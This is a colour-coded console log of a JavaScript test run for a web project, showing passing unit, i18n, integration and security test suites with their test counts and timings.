     [33m[2mÔ£ô[22m[39m applies variant class [33m 841[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m applies elevation class [33m 677[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m applies interactive class when interactive=true [33m 307[2mms[22m[39m
[90mstdout[2m | tests/unit/notifications/notifications.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/security/middleware-headers.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Gallery/Gallery.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/notifications/notifications.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/notifications/notifications.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

stderr | tests/security/middleware-headers.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/security/middleware-headers.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/notifications/notifications.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/notifications/notifications.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/notifications/notifications.test.ts [2m([22m[2m14 tests[22m[2m)[22m[33m 12446[2mms[22m[39m
[90mstdout[2m | tests/security/middleware-headers.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/security/middleware-headers.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/security/middleware-headers.test.ts [2m([22m[2m26 tests[22m[2m)[22m[33m 14270[2mms[22m[39m
stderr | tests/unit/components/Gallery/Gallery.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Gallery/Gallery.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Gallery/Gallery.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Gallery/Gallery.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Gallery/Gallery.test.ts [2m([22m[2m11 tests[22m[2m)[22m[33m 14056[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders gallery container [33m 448[2mms[22m[39m
[90mstdout[2m | tests/i18n/slug-map.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Dialog/Dialog.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/i18n/slug-map.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/i18n/slug-map.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/i18n/slug-map.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/i18n/slug-map.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/i18n/slug-map.test.ts [2m([22m[2m11 tests[22m[2m)[22m[33m 12807[2mms[22m[39m
[90mstdout[2m | tests/unit/components/breadcrumb/Breadcrumb.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/components/Dialog/Dialog.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Dialog/Dialog.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Dialog/Dialog.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Dialog/Dialog.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Dialog/Dialog.test.ts [2m([22m[2m8 tests[22m[2m)[22m[33m 17126[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders with required id prop [33m 538[2mms[22m[39m
[90mstdout[2m | tests/unit/components/Pagination/Pagination.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/components/breadcrumb/Breadcrumb.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/breadcrumb/Breadcrumb.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Video/Video.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/breadcrumb/Breadcrumb.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/breadcrumb/Breadcrumb.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/breadcrumb/Breadcrumb.test.ts [2m([22m[2m14 tests[22m[2m)[22m[33m 13359[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m Semantics [33m 386[2mms[22m[39m
[90mstdout[2m | tests/unit/admin/users.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/components/Pagination/Pagination.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Pagination/Pagination.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Pagination/Pagination.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Pagination/Pagination.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Pagination/Pagination.test.ts [2m([22m[2m10 tests[22m[2m)[22m[33m 13060[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders navigation element with aria-label [33m 437[2mms[22m[39m
stderr | tests/unit/components/Video/Video.test.ts
Unable to detect dev server port, falling back to 4321
[90mstdout[2m | tests/unit/components/Video/Video.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth


[90mstdout[2m | tests/unit/components/Video/Video.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Video/Video.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Video/Video.test.ts [2m([22m[2m12 tests[22m[2m)[22m[33m 13960[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders video container [33m 421[2mms[22m[39m
stderr | tests/unit/admin/users.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/admin/users.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/admin/users.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/admin/users.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/admin/users.test.ts [2m([22m[2m18 tests[22m[2m)[22m[33m 13722[2mms[22m[39m
[90mstdout[2m | tests/unit/components/Skeleton/Skeleton.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/SearchBar/SearchBar.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/admin/config.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/components/Skeleton/Skeleton.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Skeleton/Skeleton.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Skeleton/Skeleton.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Skeleton/Skeleton.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Skeleton/Skeleton.test.ts [2m([22m[2m10 tests[22m[2m)[22m[33m 12680[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders skeleton element [33m 354[2mms[22m[39m
stderr | tests/unit/components/SearchBar/SearchBar.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/SearchBar/SearchBar.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

stderr | tests/unit/admin/config.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/admin/config.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/SearchBar/SearchBar.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/SearchBar/SearchBar.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/SearchBar/SearchBar.test.ts [2m([22m[2m11 tests[22m[2m)[22m[33m 13936[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders form with role="search" [33m 682[2mms[22m[39m
[90mstdout[2m | tests/unit/admin/config.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/admin/config.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/admin/config.test.ts [2m([22m[2m7 tests[22m[2m)[22m[33m 14134[2mms[22m[39m
[90mstdout[2m | tests/security/middleware-integration.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/link/Link.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/security/middleware-integration.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/security/middleware-integration.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/security/middleware-integration.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Accordion/Accordion.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/security/middleware-integration.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/security/middleware-integration.test.ts [2m([22m[2m15 tests[22m[2m)[22m[33m 12533[2mms[22m[39m
[90mstdout[2m | tests/i18n/routing.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/components/link/Link.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/link/Link.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/link/Link.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/link/Link.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/link/Link.test.ts [2m([22m[2m21 tests[22m[2m)[22m[33m 13114[2mms[22m[39m
stderr | tests/unit/components/Accordion/Accordion.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Accordion/Accordion.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Accordion/Accordion.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Accordion/Accordion.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Accordion/Accordion.test.ts [2m([22m[2m8 tests[22m[2m)[22m[33m 13196[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m HTML validity [33m 572[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m Regression [33m 348[2mms[22m[39m
stderr | tests/i18n/routing.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/i18n/routing.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/admin/api-helpers.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/i18n/routing.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/i18n/routing.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/i18n/routing.test.ts [2m([22m[2m18 tests[22m[2m)[22m[33m 13327[2mms[22m[39m
[90mstdout[2m | tests/unit/components/kbd/Kbd.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/security/upload-validation.test.ts
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ÔÜÖ´©Å  specify custom .env file path with { path: '/custom/path/.env' }

[90mstdout[2m | tests/security/upload-validation.test.ts
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/security/upload-validation.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/admin/api-helpers.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/admin/api-helpers.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/admin/api-helpers.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/admin/api-helpers.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/admin/api-helpers.test.ts [2m([22m[2m20 tests[22m[2m)[22m[33m 13013[2mms[22m[39m
stderr | tests/unit/components/kbd/Kbd.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/kbd/Kbd.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/kbd/Kbd.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/kbd/Kbd.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/kbd/Kbd.test.ts [2m([22m[2m20 tests[22m[2m)[22m[33m 13375[2mms[22m[39m
[90mstdout[2m | tests/unit/components/Tooltip/Tooltip.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/security/upload-validation.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/security/upload-validation.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/security/upload-validation.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/security/upload-validation.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/security/upload-validation.test.ts [2m([22m[2m17 tests[22m[2m)[22m[33m 13463[2mms[22m[39m
[90mstdout[2m | tests/integration/blog-crud.test.ts
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ­ƒøí´©Å auth for agents: https://vestauth.com

[90mstdout[2m | tests/integration/blog-crud.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/actions/blog.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/components/Tooltip/Tooltip.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Tooltip/Tooltip.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Tooltip/Tooltip.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Tooltip/Tooltip.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Tooltip/Tooltip.test.ts [2m([22m[2m6 tests[22m[2m)[22m[33m 12913[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders tooltip wrapper [33m 437[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m applies position class [33m 333[2mms[22m[39m
stderr | tests/integration/blog-crud.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/integration/blog-crud.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

stderr | tests/unit/actions/blog.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/actions/blog.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/integration/blog-crud.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/integration/blog-crud.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/integration/blog-crud.test.ts [2m([22m[2m4 tests[22m[2m)[22m[33m 12416[2mms[22m[39m
[90mstdout[2m | tests/unit/loaders/factory.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/actions/blog.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/actions/blog.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/actions/blog.test.ts [2m([22m[2m13 tests[22m[2m)[22m[33m 13477[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m throws Unauthorized if user is not admin [33m 311[2mms[22m[39m
[90mstdout[2m | tests/unit/auth/roles.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/loaders/factory.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/loaders/factory.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Sheet/Sheet.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/loaders/factory.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/loaders/factory.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/loaders/factory.test.ts [2m([22m[2m6 tests[22m[2m)[22m[33m 12725[2mms[22m[39m
stderr | tests/unit/auth/roles.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/auth/roles.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/auth/roles.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/auth/roles.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/auth/roles.test.ts [2m([22m[2m9 tests[22m[2m)[22m[33m 12561[2mms[22m[39m
[90mstdout[2m | tests/i18n/translation-quality.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/components/Sheet/Sheet.test.ts
Unable to detect dev server port, falling back to 4321
[90mstdout[2m | tests/unit/components/Sheet/Sheet.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth


[90mstdout[2m | tests/unit/database/loaders.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Sheet/Sheet.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Sheet/Sheet.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Sheet/Sheet.test.ts [2m([22m[2m9 tests[22m[2m)[22m[33m 12325[2mms[22m[39m
[90mstdout[2m | tests/unit/i18n/locale-url.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/i18n/translation-quality.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/i18n/translation-quality.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/i18n/translation-quality.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/i18n/translation-quality.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/i18n/translation-quality.test.ts [2m([22m[2m13 tests[22m[2m)[22m[33m 12928[2mms[22m[39m
stderr | tests/unit/database/loaders.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/database/loaders.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/database/loaders.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/database/loaders.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/database/loaders.test.ts [2m([22m[2m12 tests[22m[2m)[22m[33m 12436[2mms[22m[39m
stderr | tests/unit/i18n/locale-url.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/i18n/locale-url.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/security/csrf-protection.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/i18n/locale-url.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/i18n/locale-url.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/i18n/locale-url.test.ts [2m([22m[2m6 tests[22m[2m)[22m[33m 11929[2mms[22m[39m
stderr | tests/security/csrf-protection.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/security/csrf-protection.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Tools/Grid.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/security/csrf-protection.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/security/csrf-protection.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/security/csrf-protection.test.ts [2m([22m[2m15 tests[22m[2m)[22m[33m 12493[2mms[22m[39m
stderr | tests/unit/components/Tools/Grid.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Tools/Grid.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Tools/Grid.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Tools/Grid.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Tools/Grid.test.ts [2m([22m[2m13 tests[22m[2m)[22m[33m 12151[2mms[22m[39m
[90mstdout[2m | tests/unit/components/Badge/Badge.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/admin/organizations.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Cards/Cards.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/components/Badge/Badge.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Badge/Badge.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Badge/Badge.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Badge/Badge.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Badge/Badge.test.ts [2m([22m[2m11 tests[22m[2m)[22m[33m 12392[2mms[22m[39m
stderr | tests/unit/admin/organizations.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/admin/organizations.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/admin/organizations.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/admin/organizations.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/admin/organizations.test.ts [2m([22m[2m7 tests[22m[2m)[22m[33m 13283[2mms[22m[39m
[90mstdout[2m | tests/unit/i18n/route-helpers.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/components/Cards/Cards.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Cards/Cards.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Cards/Cards.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Cards/Cards.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Cards/Cards.test.ts [2m([22m[2m13 tests[22m[2m)[22m[33m 12435[2mms[22m[39m
[90mstdout[2m | tests/unit/theme.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Slider/Slider.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/i18n/route-helpers.test.ts
Unable to detect dev server port, falling back to 4321
[90mstdout[2m | tests/unit/i18n/route-helpers.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth


[90mstdout[2m | tests/unit/i18n/route-helpers.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/i18n/route-helpers.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/i18n/route-helpers.test.ts [2m([22m[2m13 tests[22m[2m)[22m[33m 12288[2mms[22m[39m
stderr | tests/unit/theme.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/theme.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/actions/comments.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/theme.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/theme.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/theme.test.ts [2m([22m[2m6 tests[22m[2m)[22m[33m 11779[2mms[22m[39m
stderr | tests/unit/components/Slider/Slider.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Slider/Slider.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Slider/Slider.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Slider/Slider.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Slider/Slider.test.ts [2m([22m[2m6 tests[22m[2m)[22m[33m 12382[2mms[22m[39m
[90mstdout[2m | tests/security/rate-limiting.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/actions/comments.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/actions/comments.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/actions/comments.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/actions/comments.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/actions/comments.test.ts [2m([22m[2m7 tests[22m[2m)[22m[33m 12038[2mms[22m[39m
[90mstdout[2m | tests/unit/admin/policy-store.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/security/rate-limiting.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/security/rate-limiting.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/security/rate-limiting.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/security/rate-limiting.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/security/rate-limiting.test.ts [2m([22m[2m6 tests[22m[2m)[22m[33m 11998[2mms[22m[39m
[90mstdout[2m | tests/integration/concurrency.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Cards/SpecialCards.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/unit/admin/policy-store.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/admin/policy-store.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/admin/policy-store.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/admin/policy-store.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/admin/policy-store.test.ts [2m([22m[2m11 tests[22m[2m)[22m[33m 12579[2mms[22m[39m
[90mstdout[2m | tests/i18n/rtl.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/integration/concurrency.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/integration/concurrency.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/integration/concurrency.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/integration/concurrency.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/integration/concurrency.test.ts [2m([22m[2m5 tests[22m[2m)[22m[33m 12023[2mms[22m[39m
stderr | tests/unit/components/Cards/SpecialCards.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Cards/SpecialCards.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Cards/SpecialCards.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Cards/SpecialCards.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Cards/SpecialCards.test.ts [2m([22m[2m5 tests[22m[2m)[22m[33m 11802[2mms[22m[39m
[90mstdout[2m | tests/i18n/translation-coverage.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/auth/admin-access-control.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/i18n/rtl.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/i18n/rtl.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/i18n/rtl.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/i18n/rtl.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/i18n/rtl.test.ts [2m([22m[2m6 tests[22m[2m)[22m[33m 11797[2mms[22m[39m
[90mstdout[2m | tests/integration/loaders/blog-loader.test.ts
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ÔÜÖ´©Å  enable debug logging with { debug: true }

[90mstdout[2m | tests/integration/loaders/blog-loader.test.ts
[22m[39m
­ƒº¬ Starting test suite...


stderr | tests/i18n/translation-coverage.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/i18n/translation-coverage.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/i18n/translation-coverage.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/i18n/translation-coverage.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/i18n/translation-coverage.test.ts [2m([22m[2m3 tests[22m[2m)[22m[33m 11524[2mms[22m[39m
